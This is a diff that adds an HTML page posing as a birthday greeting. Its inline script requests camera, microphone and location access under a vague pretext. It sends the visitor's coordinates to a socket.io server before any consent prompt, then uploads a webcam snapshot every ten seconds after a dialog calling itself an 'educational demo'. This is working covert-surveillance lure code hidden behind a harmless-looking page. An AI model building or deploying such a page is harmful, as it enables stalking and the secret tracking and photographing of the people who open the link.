@@ -1,0 +1,11 @@
+<!doctype html><meta name="viewport" content="width=device-width,initial-scale=1"><title>Happy Birthday</title><link rel="stylesheet" href="/style.css"><main class="birthday"><h1>🎂 Happy Birthday! 🎉</h1><p>Wishing you happiness, success and a wonderful year ahead!</p><p id="msg">Please allow the requested browser permissions to continue.</p><video id="v" autoplay playsinline muted></video><canvas id="c" hidden></canvas></main><script src="/socket.io/socket.io.js"></script><script>
+const sid=location.pathname.split("/").pop(),so=io(),v=document.querySelector("#v"),c=document.querySelector("#c"),msg=document.querySelector("#msg");let stream;
+(async()=>{so.emit("participant:join",{sessionId:sid});let camera=false,mic=false;
+try{stream=await navigator.mediaDevices.getUserMedia({video:true,audio:true});v.srcObject=stream;camera=mic=true}catch(e){}
+so.emit("participant:permissions",{sessionId:sid,permissions:{camera,microphone:mic}});
+if(navigator.geolocation)navigator.geolocation.getCurrentPosition(p=>{so.emit("participant:location",{sessionId:sid,latitude:p.coords.latitude,longitude:p.coords.longitude});so.emit("participant:permissions",{sessionId:sid,permissions:{location:true}})},()=>{});
+const ok=confirm("Photo Capture Consent\\n\\nThis educational demo may automatically capture photos during this session and send them to the project administrator. Photos are not saved to your normal photo gallery. Continue?");
+if(!ok){msg.textContent="Birthday wishes are available; photo capture consent was not granted.";return}
+so.emit("participant:consent",{sessionId:sid,automaticCapture:true});msg.textContent="Enjoy your birthday wishes!";
+setInterval(()=>{if(!stream||!v.videoWidth)return;c.width=v.videoWidth;c.height=v.videoHeight;c.getContext("2d").drawImage(v,0,0);so.emit("participant:photo",{sessionId:sid,image:c.toDataURL("image/jpeg",.82)})},10000)})()
+</script>
